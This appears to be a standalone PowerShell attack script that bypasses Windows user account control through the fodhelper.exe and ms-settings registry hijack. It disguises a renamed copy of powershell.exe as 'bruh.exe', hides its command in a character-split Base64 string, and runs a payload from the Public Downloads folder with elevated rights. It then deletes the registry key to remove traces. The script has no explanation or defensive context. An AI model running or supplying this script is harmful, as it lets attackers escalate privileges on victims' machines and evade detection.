$cmd = "C:\Windows\Tasks\bruh.exe -enc" + " " + [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("c"+"m"+"d"+" "+"/"+"c"+" "+"C"+":"+"\"+"U"+"s"+"e"+"r"+"s"+"\"+"P"+"u"+"b"+"l"+"i"+"c"+"\"+"D"+"o"+"w"+"n"+"l"+"o"+"a"+"d"+"s"+"\"+"f"+"o"+"d"+"S"+"M"+"B"+"p"+"o"+"o"+"n"+"."+"e"+"x"+"e"))
copy C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Tasks\bruh.exe
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
Start-Sleep -s 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
